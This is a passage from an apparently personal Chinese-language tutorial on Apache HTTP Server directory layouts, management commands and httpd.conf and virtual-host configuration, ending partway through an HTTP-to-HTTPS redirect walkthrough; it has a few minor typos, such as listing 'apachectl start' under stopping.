名称为apache2\n自定义程度最高，所有文件通常都集中在指定的前缀下（默认为/usr/local/apache2）\n/ # 根目录 └── usr/ └── local/ └── apache2/ ├── bin/ # 可执行文件 (httpd, apachectl, ab等) ├── build/ # 编译时使用的脚本和工具 ├── cgi-bin/ # CGI脚本示例目录 ├── conf/ # 配置文件目录 │ ├── httpd.conf # 主配置文件 │ ├── extra/ # 额外的配置文件 (vhosts.conf, ssl.conf等) │ └── mime.types ├── htdocs/ # 默认 Web 根目录 │ └── index.html ├── icons/ # Apache默认图标目录 ├── include/ # C/C++头文件，用于开发模块 ├── logs/ # 日志文件目录 (access_log, error_log) └── modules/ # 动态加载的模块 (.so 文件) Debian/Ubuntu官方仓库 (通过apt安装) 名称为apache2\n目录结构遵循Debian的策略，将配置文件、模块和站点配置分拆到不同目录，便于管理\n/ # 根目录 ├── etc/ │ └── apache2/ │ ├── apache2.conf # 主配置文件，主要包含全局设置 │ ├── conf-available/ # 可用的配置片段目录 │ ├── conf-enabled/ # 已启用的配置片段 (符号链接) │ ├── mods-available/ # 可用的模块配置文件 (.load, .conf) │ ├── mods-enabled/ # 已启用的模块 (符号链接) │ ├── sites-available/ # 可用的虚拟主机配置文件 │ │ └── 000-default.conf │ └── sites-enabled/ # 已启用的虚拟主机配置 (符号链接) │ └── 000-default.conf -\u0026gt; ../sites-available/000-default.conf │ ├── usr/ │ ├── sbin/ │ │ └── apache2ctl # Apache 控制脚本 │ └── lib/ │ └── apache2/ │ └── modules/ # 模块二进制文件 (.so) │ ├── var/ │ ├── www/ │ │ └── html/ # 默认 Web 根目录 │ │ └── index.html │ └── log/ │ └── apache2/ # 日志文件目录 │ ├── access.log │ └── error.log └── lib/ └── systemd/ └── system/ └── apache2.service # Systemd 服务单元 CentOS/RHEL官方仓库 (通过yum/dnf安装) 名称为httpd\n目录结构与Debian系有所不同，但同样遵循系统规范\n关于systemd位置的问题，可以查看：nginx入门 — systemd / # 根目录 ├── etc/ │ └── httpd/ │ ├── conf/ │ │ └── httpd.conf # 主配置文件 │ ├── conf.d/ # 子配置目录，所有 .conf 文件会被自动加载 │ │ └── welcome.conf │ └── conf.modules.d/ # 模块加载配置目录 │ ├── usr/ │ ├── sbin/ │ │ └── httpd # 主程序二进制文件 │ └── lib64/ │ └── httpd/ │ └── modules/ # 模块二进制文件 (.so) │ ├── var/ │ ├── www/ │ │ ├── html/ # 默认 Web 根目录 │ │ └── cgi-bin/ │ └── log/ │ └── httpd/ # 日志文件目录 │ ├── access_log │ └── error_log │ └── usr/ └── lib/ └── systemd/ └── system/ └── httpd.service # Systemd 服务单元 Docker镜像（官方 httpd） docker镜像目录结构取决于镜像的制作者，没有自己的专属结构\n以官方的httpd镜像为例，它是基于Debian或Alpine Linux构建的，其内部结构通常类似于源码编译安装\n/ # 根目录 └── usr/ └── local/ └── apache2/ ├── bin/ ├── cgi-bin/ ├── conf/ # 配置文件目录 (可挂载) ├── htdocs/ # 默认 Web 根目录 (可挂载) ├── icons/ ├── include/ ├── logs/ # 日志文件目录 (符号链接) └── modules/ 唯一要注意的是日志文件：\nDocker容器的httpd的日志输出到标准输出(stdout)和标准错误(stderr)，而不是写入文件\n执行如下命令：\ngrep -E \u0026#34;ErrorLog|CustomLog\u0026#34; /usr/local/apache2/conf/httpd.conf 输出中会有这样两行：\nErrorLog /proc/self/fd/2 CustomLog /proc/self/fd/1 common 也就是说，访问日志和错误日志不会被写入文件，而是重定向到标准输入和标准错误\n我们可以通过docker的命令来查看它们：\ndocker logs \u0026lt;容器ID\u0026gt; 宝塔面板 宝塔面板中Apache名称仍为apache或httpd（取决于系统）\n为了方便管理，宝塔有下面的这些特点：\n每个站点有独立的根目录 每个站点日志独立 主程序和配置统一管理在 /www/server/httpd/ / # 根目录 ├── www/ │ ├── wwwroot/ # 网站根目录，每个站点一个文件夹 │ │ ├── example1.com/ │ │ │ ├── index.html │ │ │ └── ...其他文件 │ │ └── example2.com/ │ │ ├── index.html │ │ └── ... │ ├── wwwlogs/ # 站点日志目录 │ │ ├── example1.com.log │ │ └── example1.com.error.log │ │ ├── example2.com.log │ │ └── example2.com.error.log │ │ ├── ... │ └── server/ │ └── httpd/ │ ├── conf/ # 主配置文件 │ │ └── httpd.conf │ ├── conf/vhost/ # 虚拟主机配置，每个站点一个.conf │ │ ├── example.com.conf │ │ └── test.com.conf │ ├── logs/ # Apache全局日志 │ │ ├── access.log │ │ └── error.log │ ├── modules/ # Apache模块 (.so) │ └── sbin/ # 可执行文件 httpd, apachectl 等 └── etc/ └── init.d/ └── bt # 宝塔面板统一管理脚本（启动/停止Apache） 有以下几个需要注意的：\n/www/server/httpd/sbin/httpd为主程序，宝塔一般会在/usr/bin/httpd做软连接，方便命令行直接运行\n/etc/init.d/bt面板也可以控制Apache启动、停止、重载\n/www/wwwlogs/\u0026lt;domain\u0026gt;.log为每个站点单独日志 ，/www/server/httpd/logs/为Apache全局日志，记录全局错误（和nginx不同，不强制记录站点严重错误）及未单独指定站点的请求\n常用命令 使用systemctl管理Apache 适用于通过系统包管理器安装的Apache服务，比如apache2或httpd\n下文以apache2为例\n启动 systemctl start apache2 停止 systemctl stop apache2 重启 systemctl restart apache2 重新加载配置 不会中断现有连接\nsystemctl reload apache2 查看状态 systemctl status apache2 # 或 httpd 使用apachectl（或 apache2ctl） 这是Apache自带的控制工具，适合调试、配置检查\n它其实就是对httpd可执行程序的一个封装，方便管理Apache\n启动 apachectl start 停止 apachectl start 重新加载配置 不会中断现有连接\napachectl graceful 查看版本 apachectl -v 检查配置文件语法 apachectl -t Debian/Ubuntu专属工具：a2en* / a2dis* 这些工具主要管理站点配置和模块，对/etc/apache2/下的文件进行操作\n启用：在*-available → *-enabled创建符号链接 禁用：删除对应链接 操作之后要记得重启（reload / graceful）\n管理站点（虚拟主机） —— site /etc/apache2/sites-enabled/site.conf -\u0026gt; /etc/apache2/sites-available/site.conf\n启用站点 a2ensite site.conf site.conf是要启用的虚拟主机配置文件，它定义了一个网站在Apache上的访问方式，包括域名、网站目录、日志路径等\n禁用站点 a2dissite site.conf 管理模块 —— mod /etc/apache2/mods-enabled/module_name.load -\u0026gt; /etc/apache2/mods-available/module_name.load\n/etc/apache2/mods-enabled/module_name.os -\u0026gt; /etc/apache2/mods-available/module_name.os\n部分模块会有配置文件：\n/etc/apache2/mods-enabled/module_name.conf -\u0026gt; /etc/apache2/mods-available/module_name.conf\n启用模块 a2enmod module_name module_name是要启动的模块名称，不用带后缀名\n禁用模块 a2dismod module_name 管理配置文件 —— conf /etc/apache2/conf-enabled/config_name.conf -\u0026gt; /etc/apache2/conf-available/config_name.conf\n启用配置 a2enconf config_name config_name是要加载的配置文件名称，不用带后缀名\n禁用配置 a2disconf file.conf 使用bt管理Apache 在宝塔面板中，/etc/init.d/bt并不是单独只管理Apache的启动脚本，而是宝塔统一的管理脚本\n它的作用类似于传统Linux的服务脚本，但通过一个入口统一管理多个服务\n使用的方式类似systemctl，下文以apache2为例\n启动 /etc/init.d/bt start apache2 停止 /etc/init.d/bt stop apache2 重启 /etc/init.d/bt restart apache2 重新加载配置 不会中断现有连接\n/etc/init.d/bt reload apache2 查看状态 /etc/init.d/bt status apache2 # 或 httpd 主配置文件 (httpd.conf) 主配置文件在各个不同系统的路径不同：\n在RHEL/CentOS上通常是/etc/httpd/conf/httpd.conf\n在Debian/Ubuntu上是/etc/apache2/apache2.conf\n它定义了服务器的全局行为、加载的模块、默认设置以及如何包含其他配置文件\n不同系统配置文件使用的语法也差不多，以下是一个典型的httpd.conf（RHEL/CentOS风格）文件的结构：\n# -------------------- 全局配置 -------------------- ServerRoot \u0026#34;/etc/httpd\u0026#34; Listen 80 User apache Group apache PidFile run/httpd.pid Timeout 60 KeepAlive On MaxKeepAliveRequests 100 KeepAliveTimeout 5 # -------------------- 模块加载与条件判断 -------------------- # 直接加载关键模块 LoadModule mpm_event_module modules/mod_mpm_event.so LoadModule authz_core_module modules/mod_authz_core.so # 包含其他模块配置文件 Include conf.modules.d/*.conf # -------------------- 主服务器配置 -------------------- ServerAdmin root@localhost # ServerName www.example.com:80 # 使用\u0026lt;IfModule\u0026gt;确保模块存在时才应用指令 \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; DocumentRoot \u0026#34;/var/www/html\u0026#34; # -------------------- 目录与文件访问控制 -------------------- # 限URL需要认证 \u0026lt;Location /admin\u0026gt; AuthType Basic AuthName \u0026#34;Admin Area\u0026#34; AuthUserFile /etc/httpd/.htpasswd Require valid-user \u0026lt;/Location\u0026gt; # 默认禁止访问所有文件系统 \u0026lt;Directory /\u0026gt; AllowOverride none Require all denied \u0026lt;/Directory\u0026gt; # 开放 Web 根目录的访问权限 \u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; Options Indexes FollowSymLinks AllowOverride None Require all granted \u0026lt;/Directory\u0026gt; # 使用\u0026lt;Files\u0026gt;块保护敏感文件 \u0026lt;Files \u0026#34;.ht*\u0026#34;\u0026gt; Require all denied \u0026lt;/Files\u0026gt; # -------------------- 日志配置 -------------------- ErrorLog \u0026#34;logs/error_log\u0026#34; LogLevel warn LogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; \\\u0026#34;%{User-Agent}i\\\u0026#34;\u0026#34; combined CustomLog \u0026#34;logs/access_log\u0026#34; combined # -------------------- 包含其他配置文件 -------------------- IncludeOptional conf.d/*.conf 全局配置 这部分指令定义了Apache服务器的底层运行参数，影响服务器的整体性能和安全\nServerRoot \u0026#34;/etc/httpd\u0026#34; Listen 80 User apache Group apache PidFile run/httpd.pid Timeout 60 KeepAlive On MaxKeepAliveRequests 100 KeepAliveTimeout 5 ServerRoot：指定Apache的安装根目录\n配置文件中的所有相对路径（如PidFile, ErrorLog）都将基于此目录进行解析\nListen：指定服务器监听的网络地址和端口\n若不指定IP地址，则监听所有网络接口\n可以配置多个Listen指令来监听不同的端口或地址，例如Listen 80和Listen 127.0.0.1:8080\nUser \u0026amp; Group：设置运行Apache工作进程的系统用户和用户组\n主进程（master process）以root身份启动以绑定低位端口（\u0026lt;1024），但子进程会切换到此处的低权限用户，这是关键的安全措施\nPidFile：指定于存放Apache主进程的进程ID（PID）的文件\n这个文件被apachectl等控制脚本用来向主进程发送信号（如stop, restart, reload）\n路径通常是相对于ServerRoot的，如果没写，Apache 会用编译时的默认路径：\nDebian/Ubuntu：/var/run/apache2/apache2.pid RHEL/CentOS：/var/run/httpd/httpd.pid 源码安装：logs/httpd.pid Timeout：服务器在各种网络操作中等待的秒数，包括等待接收GET请求、在TCP包发送之间等待ACK等\n如果超过此时长，连接将被视为超时并关闭\nKeepAlive：启用HTTP持久连接\n开启后，客户端可以在同一个TCP连接上发送多个请求，极大减少了TCP握手和慢启动的开销，显著提升网站加载速度，特别是对于包含大量小资源的页面\nMaxKeepAliveRequests：在KeepAlive开启时，限制单个持久连接上允许处理的最大请求数\n达到此数目后，连接会自动关闭，有助于防止某个客户端长时间占用连接，并能周期性地回收资源\nKeepAliveTimeout：在KeepAlive开启时，设置服务器完成请求后等待下次请求的最长时间（秒）\n如果超时仍未收到新请求，连接将关闭\n合理的设置（通常是2-5秒）可以在性能和服务器资源消耗之间取得平衡\n模块加载与条件判断 Apache的功能是高度模块化的，使用任何高级功能（如SSL、重写、代理）前，必须先加载对应的模块\nLoadModule mpm_event_module modules/mod_mpm_event.so LoadModule authz_core_module modules/mod_authz_core.so Include conf.modules.d/*.conf \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; LoadModule：在服务器启动时动态加载指定的模块，使其提供的功能和指令在配置中可用\n语法为：\nLoadModule \u0026lt;模块名\u0026gt; \u0026lt;模块文件路径\u0026gt; 模块名是模块内部定义的标识符，路径通常是相对于ServerRoot的\nInclude：把其它配置文件包含进来\nApache（httpd）的模块配置通常被拆分放在conf.modules.d/目录下，每个模块一个配置文件：\n/etc/httpd/conf.modules.d/00-base.conf /etc/httpd/conf.modules.d/00-mpm.conf /etc/httpd/conf.modules.d/01-cgi.conf 这些.conf文件里一般只有一两行LoadModule 指令：\nLoadModule mpm_prefork_module modules/mod_mpm_prefork.so LoadModule rewrite_module modules/mod_rewrite.so LoadModule ssl_module modules/mod_ssl.so 那么主配置文件（httpd.conf）里只要写下面的include命令：\nInclude conf.modules.d/*.conf 这样就能把这些模块加载指令全部引入，模块配置更加独立，更好管理\n\u0026lt;IfModule\u0026gt;块：条件容器块，其内部的指令仅在指定的模块被加载时才会被处理\n这使得配置文件具有更好的可移植性，如果将配置文件部署到一个没有加载特定模块的服务器上，Apache不会因为无法识别模块内的指令而启动失败，而是会忽略整个\u0026lt;IfModule\u0026gt;块\n\u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; 在上面的例子，DirectoryIndex指令只有mod_dir模块（在配置文件里显示为dir_module）存在时才生效\n主服务器配置 这部分指令定义了“默认服务器”的行为\n当一个请求的Host头没有匹配到任何\u0026lt;VirtualHost\u0026gt;块时，Apache会使用这里的配置来处理该请求\nServerAdmin root@localhost ServerName www.example.com:80 DocumentRoot \u0026#34;/var/www/html\u0026#34; \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; ServerAdmin：设置了服务器管理员的电子邮件地址\n这个地址会显示在Apache生成的错误页面中，方便用户报告问题\nServerName：为服务器设置一个规范的域名\n如果未设置，Apache会尝试通过反向DNS查找来确定，这可能导致启动缓慢或结果不准确\n在全局配置中，它主要用于服务器自我识别和生成重定向URL\nDocumentRoot：该指令指定了存放网页文件的根目录\n当收到一个请求时，Apache会在此目录下查找对应的文件\nDirectoryIndex：当客户端请求一个目录（URL以/结尾）时，Apache会在此目录中查找的文件列表\n这是Apache模块dir_module里的命令\n它会按照指令中列出的顺序查找，并返回第一个找到的文件作为响应\nDirectoryIndex index.html index.php 比如上面的命令，如果用户访问http://www.example.com/docs/（这是个目录），Apache会依次查找：\n/var/www/example/docs/index.html /var/www/example/docs/index.php 然后将找到的第一个存在的文件返回\n如果都没有，可能报403Forbidden，或者交给mod_autoindex显示目录列表\n目录与文件访问控制 这是Apache安全配置的核心，它允许对文件系统中的路径和特定文件名进行精细的访问控制\n\u0026lt;Location /admin\u0026gt; AuthType Basic AuthName \u0026#34;Admin Area\u0026#34; AuthUserFile /etc/httpd/.htpasswd Require valid-user \u0026lt;/Location\u0026gt; \u0026lt;Directory /\u0026gt; AllowOverride none Require all denied \u0026lt;/Directory\u0026gt; \u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; Options Indexes FollowSymLinks AllowOverride None Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Files \u0026#34;.ht*\u0026#34;\u0026gt; Require all denied \u0026lt;/Files\u0026gt; Apache通过\u0026lt;Directory\u0026gt;、\u0026lt;Files\u0026gt;、\u0026lt;Location\u0026gt;这三种核心容器块，提供了对服务器资源精细化的访问控制\n他们的语法格式十分相似，大部分内部指令也通用，只有小部分不同\n\u0026lt;Directory\u0026gt; / \u0026lt;DirectoryMatch\u0026gt;块 —— 物理路径匹配 将其中的指令应用于服务器文件系统上的物理目录以及这些目录下的所有文件和子目录\n格式：\n\u0026lt;Directory \u0026#34;物理路径\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 精确路径：\n\u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 通配符路径：\n\u0026lt;Directory \u0026#34;/var/www/users/*/public_html\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 正则有两种写法，效果相同：\n正则表达式路径（使用\u0026lt;Directory\u0026gt;，以 ~ 开头）：\n\u0026lt;Directory ~ \u0026#34;^/var/www/project-(a|b)/src\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 正则表达式路径（使用\u0026lt;DirectoryMatch\u0026gt;）：\n\u0026lt;DirectoryMatch \u0026#34;^/var/www/project-(a|b)/src\u0026#34;\u0026gt; ... \u0026lt;/DirectoryMatch\u0026gt; \u0026lt;Files\u0026gt; / \u0026lt;FilesMatch\u0026gt; 块 —— 文件名匹配 将其中的指令应用于特定文件名的文件，而不考虑这些文件位于哪个目录下\n\u0026lt;Files\u0026gt;格式：\n\u0026lt;Files \u0026#34;文件名\u0026#34;\u0026gt; ... \u0026lt;/Files\u0026gt; 具体格式参考\u0026lt;Directory\u0026gt;块\n\u0026lt;Location\u0026gt; / \u0026lt;LocationMatch\u0026gt;块 —— URL路径匹配 将其中的指令应用于客户端请求的URL路径\n它不关心这个URL最终对应到哪个文件，甚至这个URL可能根本不对应任何文件（例如由模块动态生成的内容或代理的请求）\n\u0026lt;Location\u0026gt;格式：\n\u0026lt;Files \u0026#34;文件名\u0026#34;\u0026gt; ... \u0026lt;/Files\u0026gt; 具体格式参考\u0026lt;Location\u0026gt;块\n常用指令 以下是在上述容器块中常用的指令，我们会详细说明每个指令的格式、参数和用法\nRequire：访问授权 用于定义谁可以访问资源\n格式：\nRequire [not] \u0026lt;授权类型\u0026gt; [参数] not是一个可选的修饰符，用来取反\n授权类型：\n授权类型 参数 说明 all granted / denied 无条件允许或拒绝所有请求 ip IP地址, 子网掩码, 网段 匹配客户端的IP地址\n例如192.168.1.1、10.0.0.0/8 host 主机名, 域名 匹配客户端的主机名\n例如example.org\n注意：这需要进行DNS查询，可能影响性能 valid-user (无) 要求用户必须通过身份认证 user 用户名列表 要求用户必须是已认证的指定用户之一\n例如Require user admin john group 用户组列表 要求用户必须属于已认证的指定用户组之一\n例如Require group administrators 使用Require后，在外层还可以嵌套逻辑容器：\n逻辑容器 逻辑关系 说明 \u0026lt;RequireAny\u0026gt; OR 只要有一条Require满足就允许访问 \u0026lt;RequireAll\u0026gt; AND 必须所有Require条件都满足才允许访问 \u0026lt;RequireNone\u0026gt; NOT 如果里面任意一条Require满足，就拒绝访问（取反） 示例：\n\u0026lt;Directory \u0026#34;/var/www/private\u0026#34;\u0026gt; \u0026lt;RequireAny\u0026gt; \u0026lt;RequireAll\u0026gt; Require ip 192.168.0.0/16 Require group admins \u0026lt;/RequireAll\u0026gt; Require user superadmin \u0026lt;/RequireAny\u0026gt; \u0026lt;/Directory\u0026gt; 意思是IP在192.168网段且用户属于admins组，或者用户名是superadmin的，允许访问/var/www/private\nOptions：特性控制 控制目录中可用的服务器功能和服务，只用于\u0026lt;Directory\u0026gt;块\n格式:\nOptions [+-]关键字1 [+-]关键字2 ... 可以列出多个关键字，使用+或-前缀可以在现有选项基础上添加或移除单个选项\n参数字段:\n关键字 说明 Indexes 如果目录中缺少索引文件（如 index.html），则允许服务器生成并显示该目录的文件列表 FollowSymLinks 允许服务器跟随符号链接访问其指向的文件或目录 SymLinksIfOwnerMatch 一个更安全的FollowSymLinks版本，仅当符号链接和目标文件的所有者相同时才跟随 ExecCGI 允许在该目录中执行CGI脚本 MultiViews 启用内容协商功能，当用户请求的URL没有扩展名时，服务器可以根据客户端偏好（如语言）自动选择最合适的文件 All 启用除MultiViews之外的所有选项 None 禁用所有选项 示例：\nApache的Options指令有两种使用方式：\n覆盖式（没有+/-）\nOptions Indexes FollowSymLinks 这一行会清空继承的配置，然后只启用Indexes和FollowSymLinks\n增量式（有+/-）\nOptions -Indexes -ExecCGI +FollowSymLinks 这一行会在继承父级Options的基础上修改：去掉Indexes，去掉ExecCGI，加上FollowSymLinks\nAllowOverride：覆盖控制 决定目录中的.htaccess文件是否可以覆盖主配置文件中的设置，仅能在\u0026lt;Directory\u0026gt;块中使用\n下文会详细说明.htaccess文件：.htaccess文件 格式:\nAllowOverride 关键字1 关键字2 ... 参数字段:\n关键字 说明 None 完全忽略.htaccess文件 All 允许.htaccess中的所有指令生效 AuthConfig 允许使用认证相关的指令 FileInfo 允许使用MIME类型、重写、头信息相关的指令 Indexes 允许使用索引相关的指令 Limit 允许使用访问控制指令 Options 允许在.htaccess中使用Options 指令 示例:\n\u0026lt;Directory \u0026#34;/var/www/wordpress\u0026#34;\u0026gt; AllowOverride FileInfo AuthConfig Limit \u0026lt;/Directory\u0026gt; Auth*：身份认证系列 这一系列指令共同工作，为资源设置基于用户名和密码的保护\n指令 作用 格式 说明 AuthType 设置认证类型 `AuthType Basic Digest` AuthName 设置认证区域名称 AuthName \u0026quot;提示信息\u0026quot; 浏览器密码输入框会显示该提示信息 AuthUserFile 指定用户及密码文件 AuthUserFile \u0026quot;/path/to/.htpasswd\u0026quot; 文件由 htpasswd 工具创建，存储用户名和加密密码 AuthGroupFile 指定用户组文件 AuthGroupFile \u0026quot;/path/to/.htgroups\u0026quot; 文件定义用户组及其成员，配合 Require group 使用 示例：\n\u0026lt;Location \u0026#34;/admin\u0026#34;\u0026gt; AuthType Basic AuthName \u0026#34;Admin Area\u0026#34; AuthUserFile \u0026#34;/etc/httpd/.htpasswd\u0026#34; Require valid-user \u0026lt;/Location\u0026gt; 用户访问 http://example.com/admin后：\n要求客户端进行Basic认证 浏览器弹出登录框，显示Admin Area 用户输入用户名/密码，Apache 从/etc/httpd/.htpasswd 验证 验证成功 → 允许访问/admin 验证失败 → 返回401 Unauthorized SetHandler：处理器指定 指定服务器遇到某个资源时，交给哪种处理器来处理请求\n格式：\nSetHandler \u0026lt;处理器名称\u0026gt; 参数字段\n处理器 说明 server-status 由mod_status模块处理，生成服务器状态报告 server-info 由mod_info模块处理，生成服务器详细配置信息 application/x-httpd-php 强制由PHP处理器执行（使用mod_php时） cgi-script 由mod_cgi或mod_cgid处理，执行CGI脚本 cgi 由mod_cgi处理，通常和cgi-script等价 perl-script 由mod_perl处理，执行Perl脚本 proxy-server 由mod_proxy处理，将请求代理到后端服务器 dav 由mod_dav处理，实现WebDAV功能 imap-file 由mod_imap处理，用于访问邮件文件 示例：\n\u0026lt;Location \u0026#34;/server-status\u0026#34;\u0026gt; SetHandler server-status Require ip 127.0.0.1 \u0026lt;/Location\u0026gt; 这段配置开启了Apache的服务器状态监控页面/server-status，但只允许本机访问，常用于管理员调试和性能监控\nHeader：HTTP头控制 来自mod_headers模块，用于添加、修改或删除HTTP响应头\n格式：\nHeader [condition] action 头部名称 \u0026#34;值\u0026#34; 条件参数：\n条件 (condition) 说明 early 在响应生成的早期阶段设置头部（比默认阶段更早） expr=\u0026quot;表达式\u0026quot; 只有当表达式为真时才执行该Header动作 always 无论响应状态码或其他限制，强制应用该Header 动作参数：\n动作 (action) 说明 set 设置HTTP响应头，如果同名头已存在，则覆盖它 add 添加HTTP响应头，即使同名头已存在，也会再添加一个 append 将值附加到已存在的同名头值的末尾 unset 从响应中移除指定的HTTP头 echo 仅用于调试，输出指定头的值（很少用） edit 修改已存在头的值，基于正则替换 merge 合并多个值为同一个头 示例:\n\u0026lt;FilesMatch \u0026#34;\\.(css|js)$\u0026#34;\u0026gt; Header set X-Content-Type-Options \u0026#34;nosniff\u0026#34; Header set X-Frame-Options \u0026#34;DENY\u0026#34; Header append X-Powered-By \u0026#34;Apache\u0026#34; Header set Cache-Control \u0026#34;max-age=3600\u0026#34; \u0026#34;expr=%{REQUEST_STATUS} == 200\u0026#34; Header always set Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34; \u0026lt;/FilesMatch\u0026gt; 对.css和.js文件设置响应头，防止MIME嗅探和被嵌入iframe，添加服务器标识，同时控制缓存和强制HTTPS\n日志配置 ErrorLog \u0026#34;logs/error_log\u0026#34; LogLevel warn LogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; \\\u0026#34;%{User-Agent}i\\\u0026#34;\u0026#34; combined CustomLog \u0026#34;logs/access_log\u0026#34; combined ErrorLog：错误日志文件的路径\n服务器启动、运行中的错误、模块的诊断信息都会记录在其中\nLogLevel：记录在错误日志中的信息的详细程度\n每条错误日志条目都会带有一个严重性等级，这些等级是代码里写死的，作为用户无法改变某个错误属于什么等级\nApache支持的日志级别（从高到低）如下：\n级别 描述 debug 记录所有信息，主要用于开发或调试，信息量极大，通常需编译时启用 info 普通信息，如配置加载成功、进程启动、连接创建等 notice 正常但重要的事件，如配置文件重载、进程关闭等 warn 警告信息，非致命错误，比如配置中存在问题但可以忽略或继续运行 error 运行过程中出现的错误，如连接失败、服务不可达等 crit 严重错误，Nginx可能无法继续运行 alert 必须立刻处理的严重问题 emerg 紧急状态，比如系统崩溃，Nginx无法启动 是否写入日志文件取决于LogLevel设置的阈值，只会写入大于等于当前设置等级的错误事件\n生产环境通常设置为warn以捕捉重要问题，同时避免日志泛滥\nLogFormat：指定访问日志的格式和名称\nLogFormat \u0026quot;...\u0026quot; combined表示把这个格式命名为combined\n格式字符串由固定的文本和%开头的变量组成，例如 %h (客户端IP), %\u0026gt;s (HTTP状态码), %D (处理请求的时间，单位微秒)，后面日志分析部分会详细说明\nCustomLog：设置日志文件位置，并指定使用的格式\nCustomLog \u0026quot;logs/access_log\u0026quot; combined表示使用名为combined的格式（也就是上一行定义的格式）记录访问信息到logs/access_log文件中\n虚拟主机配置文件 虚拟主机是一种技术，它允许一台物理服务器托管多个独立的网站\n与Nginx的一个server块就是一台虚拟主机不同，Apache一般将虚拟主机配置文件单独存放\n通常，我们会为每个网站创建一个独立的配置文件，在RHEL/CentOS中通常存放在conf.d/或conf/vhosts.d/ 目录下，而在Debian/Ubuntu中则存放在 sites-available/ 目录中\n\u0026lt;VirtualHost\u0026gt;块 \u0026lt;VirtualHost\u0026gt;块是定义一个虚拟主机所有配置的容器，它通过监听的IP地址和端口号来区分不同的虚拟主机\n\u0026lt;VirtualHost [ip-address]:[port]\u0026gt; ... \u0026lt;/VirtualHost\u0026gt; [ip-address]: 虚拟主机将响应的IP地址。*代表所有IP地址 [port]: 虚拟主机将监听的端口号。通常是80（HTTP）或443（HTTPS） 在一个虚拟主机配置文件中，我们可以配置与主配置文件中类似的指令，但范围仅限于这个特定的虚拟主机\n以下是一个完整的的虚拟主机配置文件示例，它处理了HTTPS服务的配置：\n# HTTPS 虚拟主机配置 \u0026lt;VirtualHost *:443\u0026gt; # 定义该虚拟主机响应的域名 ServerName www.example.com ServerAlias example.com # 为该虚拟主机指定独立的Web根目录 DocumentRoot \u0026#34;/var/www/example.com\u0026#34; # 配置独立的日志文件，便于分析 ErrorLog \u0026#34;/var/log/httpd/example.com-error.log\u0026#34; CustomLog \u0026#34;/var/log/httpd/example.com-access.log\u0026#34; combined # 开启HTTPS并指定证书文件 SSLEngine on SSLCertificateFile /etc/pki/tls/certs/example.com.crt SSLCertificateKeyFile /etc/pki/tls/private/example.com.key SSLCertificateChainFile /etc/pki/tls/certs/chain.crt # 为该站点的目录设置权限 \u0026lt;Directory \u0026#34;/var/www/example.com\u0026#34;\u0026gt; Options -Indexes +FollowSymLinks AllowOverride All Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; ServerName\n为该虚拟主机指定一个唯一的域名，当客户端的请求头中的Host字段与此处的ServerName或ServerAlias匹配时，该请求就会由这个虚拟主机处理\nServerAlias\n为虚拟主机设置一个或多个别名，例如example.com可以作为www.example.com的别名\nHTTPS 相关的指令：\nSSLEngine on: 开启SSL/TLS加密引擎 SSLCertificateFile: 指定SSL证书文件的路径（公钥，通常是.crt或.pem） SSLCertificateKeyFile: 指定与证书匹配的私钥文件路径（.key） SSLCertificateChainFile: 如果证书需要中间证书链才能被浏览器信任，则需要指定此文件 HTTP到HTTPS跳转 下面是一个经典的例子，它唯一的目的就是利用mod_rewrite模块将所有HTTP请求重定向到对应的HTTPS URL，以确保用户无论如何访问，都会被安全地引导至加密连接\n# 将所有 HTTP 请求永久重定向到 HTTPS \u0026lt;VirtualHost *:80\u0026gt; # 定义该虚拟主机响应的域名 ServerName www.example.com ServerAlias example.com # 启用URL重写引擎 RewriteEngine On # 定义重定向规则 RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L] \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt;\n*表示该虚拟主机将响应服务器上任何IP地址的请求，80指定了它只监听来自标准HTTP端口80的请求\nServerName 和 ServerAlias\n当一个请求的Host头（域名）与www.example.com或example.com匹配时，就由该虚拟主机来处理\n这确保了即使服务器上托管了多个网站，这条重定向规则也只会应用于example.com这个域名的HTTP请求，而不会影响到其他网站\nRewriteEngine On\n这是启用Apache mod_rewrite模块重写的开关，必须先开启，其下的RewriteRule指令才能生效\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n这是整个重定向逻辑的核心，它定义了一条具体的重写规则\n^(.\\*)$\n它捕获了请求路径的全部内容，例如 /about/ 或 /images/logo.png?id=123\nhttps://%{HTTP_HOST}%{REQUEST_URI}\n这是重定向的目标URL\n**https://：**将协议从HTTP改为HTTPS\n**%{HTTP_HOST}：**这是一个Apache服务器变量，它会动态地获取客户端请求头中的Host字段值\n**%{REQUEST_URI}：**另一个服务器变量，它会动态地获取请求的完整URI路径，包括查询字符串\n[R=301,L]\n这些是控制重写行为的标志\nR=301：R代表redirect（重定向），301指定了HTTP状态码为301 Moved Permanently，这个状态码告诉浏览器和搜索引擎这个跳转是永久性的，确保SEO权重不丢失\nL：last，指示Apache一旦这条规则被匹配并执行，就停止处理任何后续的重写规则\n当一个用户访问http://www.example.com/login时，整个流程如下：\n客户端向服务器的80端口发送一个HTTP请求 Apache接收到请求，根据Host头匹配到这个\u0026lt;VirtualHost *:80\u0026gt;块 RewriteEngine On生效，Apache开始检查RewriteRule RewriteRule匹配到请求路径/login 